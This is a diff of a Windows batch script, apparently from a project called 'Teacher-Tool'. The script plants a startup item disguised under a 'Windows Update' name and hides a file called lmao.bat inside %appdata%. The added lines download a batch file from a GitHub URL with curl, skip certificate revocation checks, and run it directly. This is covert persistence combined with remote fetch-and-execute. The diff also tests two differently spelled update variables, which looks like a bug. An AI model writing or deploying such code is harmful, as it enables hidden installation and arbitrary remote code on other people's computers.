@@ -233,16 +233,23 @@ attrib -s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Updat
 goto :createvbs
 :aftervbs
 
+if not %UpdateFromOnline%==True (
 attrib -s -h "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
 del "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
 attrib -s -h lmao.bat
+) else (if %WillUpd%==True (
+attrib -s -h "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
+del "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
+attrib -s -h lmao.bat
+copy "%NewVer%.bat" "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
+echo new lmao.bat installed
+)
 
 echo vbs and startup bat installed
 if %UpdatedFromOnline%==True (if %WillUpd%==False (
 curl -O --ssl-no-revoke "https://raw.githubusercontent.com/RealFoxerity/Teacher-Tool/main/Updates/%NewVer%.bat"
 echo Calling downloaded bat...
-copy "%NewVer%.bat" "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
-echo new lmao.bat installed
+call "%NewVer%.bat"
 )
 )
 
